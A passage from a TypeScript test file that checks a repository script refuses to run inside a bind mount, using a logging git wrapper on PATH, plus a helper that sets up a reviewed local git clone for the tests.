        const bin = join(dir, "bin");
        mkdirSync(bin);
        writeFileSync(join(bin, "git"), `#!/bin/sh\necho "$@" >>"${join(dir, "git.log")}"\nexec "${REAL_GIT}" "$@"\n`);
        chmodSync(join(bin, "git"), 0o755);
        const r = spawnSync("bash", [join(copy, "scripts", script), "humyna-labs/resume-sg", "--dry-run"], { encoding: "utf8", env: { PATH: `${bin}:${process.env.PATH ?? ""}`, HOME: home } });
        expect(r.status).toBe(1);
        expect(r.stderr).toMatch(/FAIL this script is inside the bind mount/);
        expect(existsSync(mark)).toBe(false);
        expect(existsSync(join(dir, "git.log"))).toBe(false);
      },
    }),
  ),
);

/** A reviewed clone of the scripts: main tracking origin/main, clean, origin a local bare repo. */
export function reviewedClone(root: string): string {
  const dir = mkdtempSync(join(tmpdir(), "reviewed-"));
  const src = join(dir, "src");
  copyScripts(root, src);
  cpSync(join(root, "ci"), join(src, "ci"), { recursive: true });
  git(src, "init", "-q", "-b", "main");
  git(src, "add", "-A");
  git(src, "-c", "user.name=t", "-c", "user.email=t@localhost", "commit", "-q", "-m", "init");
  git(dir, "clone", "-q", "--bare", "src", "remote.git");
  git(dir, "clone", "-q", "remote.git", "clone");
  return join(dir, "clone");
}
